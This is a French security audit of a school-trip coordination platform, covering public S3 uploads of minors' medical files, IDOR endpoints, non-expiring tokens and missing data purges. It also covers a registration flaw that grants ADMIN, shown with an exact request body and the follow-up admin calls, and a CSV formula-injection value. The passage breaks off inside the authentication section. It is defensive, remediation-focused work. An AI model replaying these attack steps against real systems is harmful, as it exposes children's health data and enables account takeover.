# Audit de sécurité LIAVO — Juin 2026

> Plateforme B2B SaaS de coordination de séjours scolaires. Données traitées : mineurs
> (noms, dates de naissance, allergies/infos médicales, documents médicaux, autorisations
> parentales, photos), enseignants, hébergeurs (IBAN, SIRET, factures).
> Stack : NestJS 11 + Prisma + PostgreSQL 17 (`backend/`), Next.js (`frontend/`),
> OVH Object Storage S3 Gravelines, Brevo.

---

## Section A — Storage, IDOR, flux publics, rétention (auditeur : Claude, lecture seule)

**Méthodologie.** Audit en lecture seule. Chaque point distingue **FAIT** (vu dans le code,
cité `fichier:ligne`), **INTERPRÉTATION**, **INCERTAIN**. Ce qui n'est pas vérifiable depuis
le repo est marqué **NON VÉRIFIABLE DEPUIS LE CODE** et listé en fin de section.
Threat model adopté : (a) hébergeur authentifié malveillant, (b) parent inscrit à un séjour,
(c) anonyme ayant intercepté une URL de fichier, (d) — ajouté — **SIGNATAIRE authentifié**
(rôle auto-enregistrable : `auth/dto/register-signataire.dto.ts`).

---

### A0. Storage — TOUS les uploads sont `public_read`, URL publique non signée

**FAIT.** `backend/src/storage/storage.service.ts` :
- `upload()` ligne 65 : `ACL: ObjectCannedACL.public_read`, renvoie `` `${this.publicUrl}/${key}` `` (ligne 71).
- `uploadBuffer()` ligne 88 : `ACL: ObjectCannedACL.public_read`, renvoie `` `${this.publicUrl}/${key}` `` (ligne 94).

**Il n'existe AUCUNE génération d'URL signée, AUCUN endpoint proxy authentifié.** La seule
protection d'un fichier est l'imprévisibilité de son chemin (`randomUUID()` dans la clé,
ligne 58 / 81). C'est de la **sécurité par obscurité** : quiconque obtient l'URL (transfert
d'email, en-tête `Referer`, historique navigateur, logs, ou via un des endpoints IDOR ci-dessous
qui **renvoient l'URL en clair**) lit le fichier sans aucune authentification.

**Inventaire complet des call sites d'upload et donnée rendue publique :**

| # | `fichier:ligne` | Dossier S3 | Donnée rendue publique | Risque |
|---|---|---|---|---|
| 1 | `autorisations/autorisation.service.ts:276` | `documents-medicaux/` / `attestations-assurance/` | **Document médical d'un mineur** / attestation assurance | **CRITIQUE** |
| 2 | `collaboration/collaboration.service.ts:1103` | `journal/{sejourId}/` | **Photos de mineurs** (journal de séjour) | **HAUTE** |
| 3 | `facture/facture.service.ts:65` | `factures/` | Facture Factur-X (IBAN, montants, identité client) | **MOYENNE** |
| 4 | `devis/devis.service.ts:89,296,981` | `devis/` | PDF de devis (tarifs, conditions) | MOYENNE |
| 5 | `devis/devis.service.ts:713` | `signatures-direction/` | PDF signé par la direction | MOYENNE |
| 6 | `devis/devis.service.ts:1239` | `contrats/` | Contrat signé | MOYENNE |
| 7 | `devis/devis.service.ts:1479` | `conventions/` | Convention scolaire | MOYENNE |
| 8 | `devis/devis.service.ts:1835` | `signatures/` | Document signé | MOYENNE |
| 9 | `collaboration/collaboration.service.ts:222` | `documents/` | Document partagé du séjour | MOYENNE |
| 10 | `centres/centre.service.ts:248` & `organisations/claim.service.ts:253` | `claims/` | Justificatif de revendication de centre | MOYENNE |
| 11 | `organisations/claim.service.ts:492` | `kbis/` | Extrait Kbis (SIRET, dirigeants) | MOYENNE |
| 12 | `rentabilite/rentabilite.service.ts:193` | `factures-prestataires/` | Facture prestataire | MOYENNE |
| 13 | `centres/centre.service.ts:1200` | `documents-centre/` | Document du centre | BASSE |
| 14 | `centres/centre.service.ts:1122,1141,1172` | `centres/`, `…/brochures`, `logos/` | Image, brochure, logo | BASSE (donnée publique par nature) |

**Vecteur d'attaque (menace c — anonyme).** Une URL `https://<bucket>/documents-medicaux/<uuid>.pdf`
interceptée (forward d'email parent, log applicatif, partage d'écran, ou récupérée via A1/A4)
est lue directement, sans token, sans cookie, sans expiration. Le document médical d'un mineur
est exposé à toute personne disposant du lien, indéfiniment.

**Fix recommandé.**
1. Basculer le bucket OVH en **privé** et servir les fichiers via des **URL pré-signées
   courtes** (S3 `GetObjectCommand` + `getSignedUrl`, TTL 5–15 min) générées par un endpoint
   authentifié qui vérifie l'ownership avant de signer. Estimation : 1–2 j (nouvelle méthode
   `getSignedUrl` dans `StorageService` + endpoint proxy + adaptation frontend des `<img>`/liens).
2. À défaut immédiat : segmenter au minimum les buckets (médical/photos en privé, logos en public)
   et retirer `public_read` des dossiers 1–12. Estimation : 0,5 j + revue de l'affichage frontend.

---

### A1. CRITIQUE — IDOR `verifyAccess` : tout SIGNATAIRE lit le dossier médical complet de n'importe quel séjour

**FAIT.** `backend/src/collaboration/collaboration.service.ts`, `verifyAccess()` :
- ligne 68 : `const isDirector = role === 'SIGNATAIRE';`
- ligne 79 : `if (!isCreateur && !isHebergeur && !isDirector && !accompagnateurAcces) throw …`

Le rôle `SIGNATAIRE` est traité comme « directeur autorisé » **sans aucune vérification que ce
signataire est lié au séjour visé** (pas de comparaison d'établissement, d'email, ni d'ownership).
Le seul filtre restant est le statut du séjour (`CONVENTION` / `SIGNE_DIRECTION`, lignes 57‑65).

**FAIT — donnée exposée.** `getParticipants()` ligne 269‑298, gardé uniquement par `verifyAccess`,
renvoie pour chaque mineur : `infosMedicales` (ligne 284), `documentMedicalUrl` (285),
`attestationAssuranceUrl` (288), `regimeAlimentaire`, `eleveDateNaissance`, `nomParent`,
`telephoneUrgence`, `parentEmail`, `moyenPaiement`. Idem `getJournal` (1071), `getDocuments`
(203), `getMessages` (119), `getBudgetData` (303) — tous gardés par le même `verifyAccess`.

**Vecteur d'attaque (menace d).**
1. S'enregistrer comme `SIGNATAIRE` (auto-inscription).
2. `GET /collaboration/{sejourId}/participants` avec un `sejourId` quelconque d'un séjour en
   CONVENTION (UUID v4, non énumérable par brute-force — mais fuitable par log/partage/erreur).
3. Réponse = **fiche médicale complète de tous les mineurs** du séjour d'un autre établissement,
   + URL des documents médicaux (puis lecture directe via A0).

**INTERPRÉTATION.** C'est la vulnérabilité la plus grave : exposition massive de données de
santé de mineurs (catégorie RGPD art. 9) à un rôle auto-enregistrable, cross-établissement.

**Fix recommandé.** Dans `verifyAccess`, exiger pour un SIGNATAIRE un lien réel avec le séjour :
le séjour doit avoir été **soumis à CE directeur** (vérifier `sejour.createur`'s établissement /
l'invitation directeur / un champ `directeurEmail` == `user.email`). Ne jamais accorder l'accès
sur la seule base `role === 'SIGNATAIRE'`. Estimation : 0,5 j + tests. **À traiter en premier.**

---

### A2. CRITIQUE — IDOR `GET /sejours/:id/detail` : aucune vérification d'ownership

**FAIT.** `backend/src/sejours/sejour.controller.ts:100‑104` : `@Roles(Role.SIGNATAIRE)`,
`getSejourDetail(@Param('id') id)` — **le `user` n'est même pas passé au service**.
`backend/src/sejours/sejour.service.ts:294` : `findUnique({ where: { id } })` sans aucune clause
d'ownership. Renvoie `autorisations` (élèves : `elevePrenom`, `eleveNom`, `parentEmail`,
`signeeAt` — lignes 318‑324), `accompagnateurs` (email, téléphone — 310‑317), `createur`
(email, téléphone — 298‑309), et les devis avec centre.

**Vecteur d'attaque (menace d).** Tout SIGNATAIRE authentifié : `GET /sejours/{id}/detail` pour
n'importe quel `id` → liste nominative des mineurs + emails des parents d'un autre établissement.

**INTERPRÉTATION.** Pas de données médicales ici (le `select` ne les contient pas), mais PII de
mineurs + contacts parentaux, cross-établissement. Violation RGPD.

**Fix.** Passer `user` au service et filtrer : un SIGNATAIRE ne voit que les séjours de son
établissement (même logique que `getAllSejoursSignataire`, `sejour.service.ts:189`). Estim. : 0,5 j.

---

### A3. HAUTE — IDOR `GET /sejours/:id/dossier-pedagogique` : SIGNATAIRE sans contrôle

**FAIT.** `sejour.controller.ts:107‑114` : `@Roles(ORGANISATEUR, SIGNATAIRE)`.
`sejour.service.ts:345` charge le séjour avec `autorisations` (élèves : `eleveNom`, `elevePrenom`,
`eleveDateNaissance`, `parentEmail`, `nomParent`, `telephoneUrgence`, `moyenPaiement` — lignes
390‑402). Le contrôle d'ownership ligne 411 ne couvre **que** `ORGANISATEUR`
(`if (user.role === Role.ORGANISATEUR && sejour.createurId !== user.id)`). Pour un **SIGNATAIRE,
aucun contrôle** → IDOR identique à A2.

**Correction d'une affirmation erronée d'un audit automatisé préliminaire :** ce endpoint
**n'expose PAS** `infosMedicales` ni `documentMedicalUrl` (vérifié, `select` lignes 390‑402).
La fuite de données médicales passe par A1 (`collaboration/getParticipants`), pas par celui-ci.

**INTERPRÉTATION secondaire.** Le contrôle ORGANISATEUR est exécuté *après* le `findUnique` :
ce n'est pas une fuite réseau (Nest ne renvoie rien avant le `throw`), mais déplacer le check
avant la requête est une bonne pratique de défense en profondeur.

**Fix.** Ajouter une branche d'ownership pour `SIGNATAIRE` (établissement). Estim. : 0,5 j.

---

### A4. HAUTE — IDOR `GET /demandes/:id` : tout hébergeur lit n'importe quelle demande

**FAIT.** `backend/src/demandes/demande.controller.ts:44‑48` : `@Roles(ORGANISATEUR, HEBERGEUR,
SIGNATAIRE)`, `findOne(@Param('id') id)` — **`user` non transmis**.
`backend/src/demandes/demande.service.ts:268` : `findUnique({ where: { id } })` sans ownership.
Renvoie l'enseignant (`prenom, nom, email` — ligne 272) et **tous les devis** des centres
concurrents avec `centre { id, nom, ville, email, capacite }` (273‑277).

**Vecteur d'attaque (menace a — hébergeur malveillant).** `GET /demandes/{id}` pour un `id`
quelconque → identité/email de l'enseignant + offres des hébergeurs concurrents sur cette demande
(intelligence commerciale, démarchage, phishing ciblé).

**Fix.** Transmettre `user`/`centreId` et filtrer : un HEBERGEUR ne voit une demande que si son
centre en est destinataire (`centreDestinataireId`) ou y a déposé un devis ; un ORGANISATEUR/
SIGNATAIRE que s'il en est propriétaire. Estim. : 0,5–1 j.

---

### A5. HAUTE — IDOR `GET /demandes/:id/devis/comparatif` : SIGNATAIRE sans contrôle (fuite IBAN)

**FAIT.** `demande.controller.ts:50‑54` : `@Roles(ORGANISATEUR, SIGNATAIRE)`.
`demande.service.ts:284` `getComparatif` : le contrôle ligne 290 ne couvre **que** ORGANISATEUR
(`if (user.role === 'ORGANISATEUR' && demande.enseignantId !== user.id)`). Un **SIGNATAIRE n'est
jamais contrôlé**. La requête (294‑324) renvoie le `centre` avec **`siret`, `tvaIntracommunautaire`,
`iban`** (lignes 301‑303) pour tous les devis de la demande.

**Vecteur d'attaque (menace d).** Tout SIGNATAIRE : `GET /demandes/{id}/devis/comparatif` →
IBAN + SIRET des hébergeurs et tarifs détaillés de n'importe quelle demande.

**Fix.** Ajouter un contrôle d'ownership SIGNATAIRE ; envisager de retirer `iban` du payload de
comparatif (non nécessaire à la comparaison). Estim. : 0,5 j.

---

### A6. HAUTE — Flux public `autorisations` : pas d'expiration, upload médical sur simple token

**FAIT — entropie du token.** `backend/prisma/schema.prisma:347` :
`tokenAcces String @unique @default(uuid()) @db.Uuid`. Prisma `uuid()` = **UUID v4** (≈122 bits
aléatoires). **Atténuation forte** : énumération/brute-force infaisable, d'autant qu'un
`ThrottlerGuard` global limite à 60 req/min (`app.module.ts:40‑43,77`).

**FAIT — faiblesses.** `backend/src/autorisations/autorisation.controller.ts` :
- `GET /autorisations/signer/:token` (ligne 136) — **aucun guard**. Renvoie nom/prénom de l'élève,
  infos séjour, `attestationAssuranceUrl` (`autorisation.service.ts:206‑223`).
- `PATCH /autorisations/signer/:token` (142) — **aucun guard**. `signer()` (service 226) : bloque le
  re-signing (`signeeAt`, ligne 237) mais **le token n'expire jamais** et **n'est pas invalidé**
  après usage (réutilisable pour lecture/upload indéfiniment). Aucune vérification d'expiration
  nulle part (aucun champ `tokenExpiresAt`).
- `POST /autorisations/:token/document` (152) — **aucun guard**. `uploadDocumentMedical()` (service
  268) : **quiconque possède le token peut téléverser un fichier arbitraire** (PDF/image, 10 Mo)
  dans `documents-medicaux/` en `public_read`, et écraser/poser `documentMedicalUrl`.

**Vecteur d'attaque (menace c).** Un lien `/autorisation/<token>` transféré/fuité reste
exploitable à vie : lecture des infos mineur + dépôt de documents publics dans le bucket.

**Fix.** Ajouter `tokenExpiresAt` (ex. dateFin séjour + 30 j) vérifié sur les 3 routes ; invalider
ou re-générer le token après signature ; restreindre l'upload aux autorisations non encore signées
ou dans une fenêtre temporelle. Estim. : 0,5–1 j + migration SQL manuelle (colonne).

---

### A7. MOYENNE — `journal-public/:token` : un parent voit les photos de tous les mineurs du séjour

**FAIT.** `backend/src/journal-public/journal-public.controller.ts:9‑57` : `GET /journal-public/:token`,
**aucun guard**, résolu par `tokenAcces` (même token que A6). Renvoie **tous** les `postsJournal`
du séjour avec leurs `photos` (lignes 31‑37), le planning, et le téléphone de l'hébergement (28).
Aucun filtrage par enfant.

**INTERPRÉTATION.** Conforme au threat model (b) : un parent inscrit au séjour accède aux photos
de **tous** les mineurs du séjour (enfants d'autres familles), pas seulement du sien. Un parent
d'un **autre** séjour ne peut pas y accéder (token lié à un séjour donné — pas d'IDOR
inter-séjours ici). Pas d'expiration (le lien reste actif après la fin du séjour). Combiné à A0,
les photos sont de toute façon en `public_read`.

**Fix.** Décision produit : si l'exposition inter-familles n'est pas voulue, filtrer les photos
par enfant ; sinon, documenter le consentement. Ajouter une expiration cohérente avec A6. Estim. : 0,5 j.

---

### A8. MOYENNE — Rétention : aucune purge, soft-delete, orphelins S3 publics permanents

**FAIT.**
- Suppression participant : `autorisation.service.ts:589‑603` `deleteAutorisation` fait
  `prisma.autorisationParentale.delete` mais **n'appelle jamais `storage.delete`** sur
  `documentMedicalUrl` / `attestationAssuranceUrl` → fichiers médicaux **orphelins, toujours
  publics** sur OVH.
- Suppression séjour : `sejour.service.ts:1200` `softDeleteSejour` = **soft-delete**
  (`deletedAt: new Date()`, ligne 1263). Les `autorisations` (données mineurs) restent en base
  indéfiniment ; en cas de hard-delete, `onDelete: Cascade` (`schema.prisma:378`) purgerait les
  lignes DB **mais pas** les objets S3.
- **Aucune durée de rétention codée** : recherche `retention|purge|cron|TTL` → aucun job de purge,
  aucune politique d'effacement automatique.

**INTERPRÉTATION.** Non-conformité RGPD (minimisation / limitation de conservation, art. 5‑1‑e) :
données de santé de mineurs conservées sans limite et fichiers médicaux publics jamais effacés.

**Fix.** (1) Sur `deleteAutorisation` et hard-delete séjour, appeler `storage.delete` sur tous les
URLs S3. (2) Implémenter une purge programmée (anonymisation/suppression X mois après `dateFin`).
(3) Définir et documenter une durée de rétention. Estim. : 1–2 j.

---

### A9. BASSE — Exports CSV & injection de formule

**FAIT.** Aucun **export** CSV backend de données mineurs (recherche `text/csv|Content-Disposition|
exportCsv` → uniquement un PDF en `devis.controller.ts:238`). Les seuls CSV générés sont des
**templates client-side** (`frontend/src/lib/clients.ts:243‑248,280‑285`) sans donnée mineur.
L'`importCsv` (entrée) `autorisation.service.ts:328` stocke `infosMedicales`/`regimeAlimentaire`
**bruts** sans neutraliser un préfixe `=`/`+`/`-`/`@`.

**INTERPRÉTATION.** Risque d'injection de formule **théorique et différé** : si un export CSV des
participants est ajouté plus tard, une cellule médicale du type `=HYPERLINK(...)` saisie à l'import
deviendrait active dans Excel. Pas exploitable aujourd'hui (pas d'export). À garder en tête.

**Fix (préventif).** Le jour où un export participants est créé : préfixer par `'` toute cellule
commençant par `= + - @`. Estim. : 0,25 j à ce moment-là.

---

### A10. BASSE / INFO — Sur-fetch Prisma sur `User`

**FAIT.** `model User` contient `motDePasse` (hash bcrypt, `schema.prisma:158`),
`resetPasswordToken` (166), `magicLinkToken`, `tokenVerification`. **Aucun `omit` global** dans
`PrismaService`. Plusieurs `prisma.user.create(...)` sans `select` (`auth.service.ts` ~41/69/142/219)
chargent l'objet complet, mais la réponse HTTP est filtrée manuellement (`buildAuthResponse` /
objets `{ id, email, role }`). Les `include` de relations `user`/`createur`/`auteur` utilisés vers
le frontend emploient des `select` explicites (ex. `sejour.service.ts:298`, `collaboration:124`,
`demande.service.ts:272`).

**INTERPRÉTATION.** **Aucune fuite de `motDePasse`/token confirmée** vers le frontend à ce jour.
Fragilité de défense en profondeur : une future route renvoyant un `user` sans `select` exposerait
le hash.

**Fix (défense en profondeur).** Ajouter un `omit` global Prisma (`motDePasse`, `resetPasswordToken`,
`resetPasswordExpires`, `magicLinkToken`, `tokenVerification`) dans `PrismaService`. Estim. : 0,25 j.

---

### Checklist — NON VÉRIFIABLE DEPUIS LE CODE (pour Théo)

Ces points ne peuvent pas être confirmés depuis le repo et doivent être vérifiés hors-code :

- [ ] **Policy ACL réelle du bucket OVH** : le bucket lui-même est-il en lecture/listing public ?
  Les objets `public_read` sont-ils réellement world-readable comme le code le suppose ?
  (Si le bucket est privé malgré l'ACL objet, le risque A0 chute fortement — à confirmer.)
- [ ] **`S3_PUBLIC_URL`** : pointe-t-il vers un CDN/endpoint avec une couche d'auth, ou en accès direct ?
- [ ] **Bucket listing** : `ListObjects` est-il désactivé publiquement (sinon énumération directe des
  fichiers médicaux sans connaître l'UUID) ?
- [ ] **En-têtes de sécurité déployés** (Scalingo) : HSTS, CSP, `X-Content-Type-Options`,
  `Referrer-Policy: no-referrer` (limite la fuite d'URL S3 via `Referer`).
- [ ] **Registre des traitements RGPD**, base légale, durée de rétention officielle, DPO désigné.
- [ ] **Consentement parental effectif** : le flag `rgpdAccepte`/`consentementMedical` correspond-il à
  un recueil conforme (CGU versionnées, preuve) ?
- [ ] **DPA** signés avec OVH et Brevo (sous-traitants) ; localisation des données Brevo.
- [ ] **Gestion des secrets** (`S3_SECRET_ACCESS_KEY`, `JWT`, `DATABASE_URL`) côté env Scalingo +
  logs (les `console.log` d'upload ne loguent pas l'URL, OK, mais vérifier l'absence d'URL S3 médicale
  dans les logs applicatifs/erreurs).

---

### Tableau récapitulatif — Section A

| # | Vulnérabilité | `fichier:ligne` | Menace | Sévérité | Fix (estim.) |
|---|---|---|---|---|---|
| A1 | IDOR `verifyAccess` : tout SIGNATAIRE lit le dossier **médical** de tout séjour CONVENTION | `collaboration.service.ts:68,79,269` | d | **CRITIQUE** | Lier SIGNATAIRE au séjour (0,5 j) |
| A2 | IDOR `GET /sejours/:id/detail` : aucun ownership, PII mineurs | `sejour.service.ts:294` ; `sejour.controller.ts:100` | d | **CRITIQUE** | Filtrer par établissement (0,5 j) |
| A0 | Uploads médicaux/photos en `public_read` non signé | `storage.service.ts:65,88` | c | **CRITIQUE** | Bucket privé + URL signées (1–2 j) |
| A3 | IDOR `dossier-pedagogique` : SIGNATAIRE sans contrôle | `sejour.service.ts:345,411` | d | HAUTE | Ownership SIGNATAIRE (0,5 j) |
| A4 | IDOR `GET /demandes/:id` : tout hébergeur lit toute demande | `demande.service.ts:268` | a | HAUTE | Filtrer destinataire/devis (0,5–1 j) |
| A5 | IDOR `comparatif` : SIGNATAIRE lit IBAN/SIRET concurrents | `demande.service.ts:284,290` | d | HAUTE | Ownership + retirer IBAN (0,5 j) |
| A6 | Flux public autorisations : token sans expiration/invalidation, upload médical sur token seul | `autorisation.controller.ts:136,142,152` | c | HAUTE | `tokenExpiresAt` + invalidation (0,5–1 j) |
| A7 | `journal-public` : parent voit photos de tous les mineurs, pas d'expiration | `journal-public.controller.ts:9` | b | MOYENNE | Filtrage/expiration (0,5 j) |
| A8 | Aucune rétention/purge ; orphelins S3 médicaux publics permanents | `autorisation.service.ts:589` ; `sejour.service.ts:1263` | — | MOYENNE | Purge + `storage.delete` (1–2 j) |
| A9 | Injection de formule CSV (théorique, pas d'export actuel) | `autorisation.service.ts:328` | — | BASSE | Sanitize à l'export futur (0,25 j) |
| A10 | Sur-fetch `User` (pas de fuite confirmée, pas d'`omit` global) | `prisma.service.ts` ; `auth.service.ts` | — | BASSE | `omit` global Prisma (0,25 j) |

**Facteurs atténuants confirmés :** tokens en **UUID v4** (122 bits, non énumérables) ;
`ThrottlerGuard` global 60 req/min ; les IDOR exigent de connaître un UUID valide (fuitable mais
non devinable). **Priorité de remédiation : A1 → A2 → A0 → A3 → A4/A5 → A6.**

---

## Section B — Authentification & Sessions (auditeur : Claude, lecture seule)

**Méthodologie.** Lecture intégrale de `backend/src/auth/auth.service.ts`, `auth.controller.ts`,
`strategies/jwt.strategy.ts`, `guards/{jwt-auth,roles,permission}.guard.ts`, des 5 DTO `register-*`,
de `auth.module.ts`, `main.ts`, `app.module.ts` et du `model User` (`schema.prisma:152-178`).
Chaque point distingue **FAIT** (vu, cité `fichier:ligne`), **INTERPRÉTATION**, **INCERTAIN**.
Ce qui n'est pas vérifiable depuis le repo est marqué **NON VÉRIFIABLE DEPUIS LE CODE** (checklist finale).
Threat model adopté : **(a)** anonyme qui veut entrer ; **(b)** détenteur d'un magic link fuité ;
**(c)** user authentifié qui veut devenir ADMIN ou pivoter d'établissement/centre.

**Facteurs atténuants transverses confirmés (à garder à l'esprit pour pondérer la sévérité) :**
tous les tokens (`tokenVerification`, `resetPasswordToken`, `magicLinkToken`) sont typés
`@db.Uuid` (`schema.prisma:164,166,168`) → **UUID v4, ≈122 bits**, non énumérables ; un
`ThrottlerGuard` global plafonne à **60 req/min/IP** (`app.module.ts:40-44,77`) ; `JWT_SECRET`
est `getOrThrow` (pas de secret par défaut hardcodé — `jwt.strategy.ts:22`, `auth.module.ts:17`).

---

### B0. CRITIQUE — Élévation de privilège anonyme → ADMIN via `POST /auth/register` (mass assignment du `role` + JWT émis sans aucun contrôle)

**FAIT.**
- `RegisterDto` expose un champ **`role` optionnel pris dans le body** :
  `register.dto.ts:28-30` → `@IsOptional() @IsEnum(Role) role?: Role`.
- `auth.service.ts:48` : `role: dto.role ?? Role.PARENT` — la valeur du body est écrite **telle quelle**
  dans `user.role`, sans liste blanche (aucune restriction à PARENT/ORGANISATEUR).
- `auth.service.ts:53` : `register()` retourne **`this.buildAuthResponse(user)`** → un `access_token`
  signé est délivré **immédiatement**, dans la même réponse HTTP.
- `buildAuthResponse` (`auth.service.ts:692-699`) met `role: user.role` dans le payload JWT.
- `AuthController.register` (`auth.controller.ts:19-22`) : **aucun `@Throttle`, aucun guard, aucune
  vérification d'email**. Endpoint public.
- Aucun garde aval ne rattrape : `JwtStrategy.validate` (`jwt.strategy.ts:26-33`) ne vérifie **que
  l'existence** de l'user (`findUnique`), pas `compteValide` ni `emailVerifie` ; `RolesGuard`
  (`roles.guard.ts:11-21`) ne compare **que** `user.role` au rôle requis.
- `AdminController` est gardé `@Roles(Role.ADMIN)` au niveau classe (`admin.controller.ts:23`) et
  expose notamment `GET /admin/utilisateurs` (liste tous les comptes), `PATCH /admin/utilisateurs/:id`
  qui accepte `{ role, compteValide }` (`admin.controller.ts:56-59`), `GET /admin/hebergeurs`,
  `PATCH /admin/centres/:id/...`, `GET /admin/claims`, etc.

**Vecteur d'attaque (menace a — anonyme, le plus grave de toute la plateforme).**
1. `POST /auth/register` avec `{"prenom":"x","nom":"x","email":"attaquant@x.com","password":"xxxxxxxx","role":"ADMIN"}`.
2. La réponse contient **directement** `access_token` (JWT `role=ADMIN`, valable 7 j).
3. `GET /admin/utilisateurs` → annuaire complet des comptes. `PATCH /admin/utilisateurs/:id`
   `{ "role":"ADMIN" }` → persistance. `PATCH /admin/hebergeurs/:id/valider`, accès à tous les
   centres, claims, réseaux. **Compromission totale.** Les flags `compteValide:false` /
   `emailVerifie:false` posés par défaut **n'arrêtent rien** : ils ne sont contrôlés que dans
   `login()`, jamais sur un JWT déjà émis.

**INTERPRÉTATION.** C'est la vulnérabilité la plus critique de l'application : un anonyme obtient
les pleins pouvoirs en **une requête**, sans email valide, sans throttle. Le `ValidationPipe`
global est en `whitelist:true` **sans `forbidNonWhitelisted`** (`main.ts:52`) — mais ici cela ne
protège même pas, car `role` est un champ **légitimement déclaré** dans le DTO. (Pour les autres
DTO `register-organisateur/hebergeur/signataire`, `role`/`compteValide` ne sont pas déclarés et
seraient donc strippés silencieusement — l'escalade passe **uniquement** par `RegisterDto`.)

**INCERTAIN.** Le frontend n'appelle peut-être que `register/organisateur|signataire|hebergeur` et
jamais `POST /auth/register` brut ; mais l'endpoint reste **monté et public** côté backend, donc
exploitable directement (curl/Postman), indépendamment de l'UI.

**Fix recommandé.**
1. **Supprimer le champ `role` de `RegisterDto`** (et tout `dto.role` dans `register()`), ou le
   forcer en dur (`role: Role.PARENT`). 
2. Ne **jamais** renvoyer de JWT depuis un endpoint d'inscription public : retourner un simple
   message + exiger vérification email avant émission de token (cohérent avec les flux
   organisateur/signataire). 
3. Idéalement, déprécier `POST /auth/register` au profit des routes typées par rôle, ou le réserver
   à un appelant authentifié ADMIN. Estimation : **0,25 j** (suppression du champ + retrait du token)
   — **à traiter en tout premier, avant A1.**

---

### B1. CRITIQUE — JWT 7 jours, sans révocation ni contrôle d'état dans `validate()` (token volé ou compte suspendu reste actif jusqu'à 7 j)

**FAIT.**
- Durée de vie : `signOptions: { expiresIn: '7d' }` (`auth.module.ts:18`). Aucun **refresh token**,
  aucune **liste de révocation**, aucun champ `tokenVersion`/`tokenInvalidatedAt` sur `User`
  (`schema.prisma:152-178` — vérifié, inexistant).
- `JwtStrategy.validate` (`jwt.strategy.ts:26-33`) recharge l'user mais **ne lit ni `compteValide`
  ni `emailVerifie`** (`select` lignes 29 : `id, email, role, reseauNom, reseauNomComplet`) et ne
  rejette que si l'user **n'existe plus**.
- L'admin peut « refuser » un hébergeur (`admin.controller.ts:46-48`
  `refuserHebergeur`) — **INCERTAIN** sur l'effet exact (suspension `compteValide:false` vs
  suppression). S'il s'agit d'une simple mise à `compteValide:false`, l'user **garde un JWT
  pleinement valide** jusqu'à expiration naturelle.

**Vecteur d'attaque (menaces b et c).**
- Un JWT exfiltré (XSS, fuite de log, partage d'appareil, `#token=` resté en historique — cf. B3)
  reste exploitable **jusqu'à 7 jours**, sans aucun moyen de le révoquer côté serveur.
- Un compte hébergeur **désactivé** par l'équipe (`compteValide:false`) continue d'agir avec son
  ancien token : `validate()` ne revérifie pas le flag. La désactivation n'est donc **pas
  immédiate**.

**INTERPRÉTATION.** Sessions longues + absence de révocation = fenêtre d'abus large. Combiné à B2
(set-password sans ré-auth), un token volé permet une **prise de contrôle persistante** (changement
de mot de passe), bien au-delà des 7 jours.

**Fix recommandé.**
1. Réduire `expiresIn` (ex. 1 h) + introduire un **refresh token** rotatif stocké/révocable.
2. À défaut immédiat : ajouter dans `validate()` un contrôle d'état
   (`if (user.role==='HEBERGEUR' && !user.compteValide) throw`), et un champ `tokenVersion` (entier
   sur `User`, copié dans le payload, comparé dans `validate`) pour invalider tous les tokens d'un
   compte (logout global / suspension). Estimation : **1–2 j** (migration SQL `token_version` +
   logique `validate` + incrément sur reset/suspension).

---

### B2. HAUTE — `set-password` (`JwtAuthGuard` seul) : tout détenteur d'un JWT (re)définit le mot de passe sans connaître l'ancien

**FAIT.**
- `auth.controller.ts:92-97` : `POST /auth/set-password`, `@UseGuards(JwtAuthGuard)` **seul**
  (pas de `@Roles`, pas de re-auth), body `{ password }`.
- `definirMotDePasse` (`auth.service.ts:710-720`) : écrit `motDePasse` + `motDePasseDefini:true`
  sur **`user.id` issu du JWT**, **sans jamais demander le mot de passe actuel** ni revérifier
  l'identité. Validation minimale : `password.length >= 8` (ligne 711). bcrypt **rounds = 10**
  (ligne 714).

**Chaîne complète magic link → JWT → set-password (menace b/c).**
1. Compte « dormant » créé sans mot de passe via une demande publique (`motDePasseDefini:false`).
2. Un magic link est consommé (`consommerMagicLink`, `auth.service.ts:647-666`) → JWT + redirection
   `#needsPassword=true`.
3. Le porteur du JWT appelle `POST /auth/set-password { password }` → définit le mot de passe et
   **prend le contrôle définitif** du compte **sans connaître aucun ancien secret**.

C'est le **flux d'onboarding prévu** pour les comptes dormants (le magic link fait office de preuve
de possession de l'email — légitime). **Le risque** : l'endpoint ne distingue pas
« premier mot de passe » de « changement », et n'exige **aucune ré-authentification**. Donc :
- Un JWT **volé** (cf. B1/B3) d'un compte déjà actif permet à l'attaquant de **réécrire le mot de
  passe** → verrouillage du propriétaire légitime + persistance au-delà de l'expiration du token.

**INTERPRÉTATION.** Sévérité HAUTE car combinable avec tout vol/fuite de token, et parce qu'il n'y
a pas de garde-fou (re-auth, vérification `motDePasseDefini` côté serveur pour bloquer un *reset*
silencieux sur un compte déjà initialisé).

**Fix recommandé.**
1. Pour un **changement** (compte déjà `motDePasseDefini:true`) : exiger l'ancien mot de passe
   (ou un flux reset-password par email).
2. Restreindre `set-password` au cas `motDePasseDefini:false` (refuser sinon) — l'initialisation
   one-shot post-magic-link.
3. Aligner les rounds bcrypt (cf. B7). Estimation : **0,5 j**.

---

### B3. HAUTE — Magic link : TTL 7 jours, token dans l'URL GET (loggable/Referer), consommation qui force `compteValide:true` + `emailVerifie:true`

**FAIT — entropie & cycle de vie.**
- Token = `randomUUID()` (`auth.service.ts:674`), colonne `@db.Uuid` → **UUID v4, robuste**.
- **TTL = 7 jours** : `magicExpires = Date.now() + 7*24*60*60*1000` (`auth.service.ts:675`).
- **Usage unique** : à la consommation, `magicLinkToken:null, magicLinkExpires:null`
  (`auth.service.ts:656-659`) → non rejouable. **Atténuation correcte.**
- `genererMagicUrl` retourne `${FRONTEND_URL}/auth/magic/${magicToken}` (`auth.service.ts:681`) →
  le token transite **dans le chemin d'une requête GET** (`GET /auth/magic/:token`,
  `auth.controller.ts:69-72`, **aucun guard, aucun `@Throttle`** dédié — seul le throttle global
  60/min s'applique).

**FAIT — ce qui est émis à la consommation.**
- `consommerMagicLink` (`auth.service.ts:656-665`) : force `compteValide:true` **et**
  `emailVerifie:true`, signe un JWT (`payload {sub,email,role}`), puis **redirige avec le JWT dans
  le fragment d'URL** : `#token=...&onboarding=true[&needsPassword=true]` (lignes 663-665).
- **Bon point** : le JWT est dans le **fragment** (`#`) → non transmis au serveur, donc **absent
  des logs serveur / en-tête `Referer` sortant**. Reste présent dans l'historique navigateur.
- **Open redirect** : la cible est construite sur `process.env.FRONTEND_URL` (constante serveur),
  **pas** sur une valeur contrôlée par l'attaquant → **pas d'open redirect** ici. (FAIT.)

**Faiblesses (FAIT).**
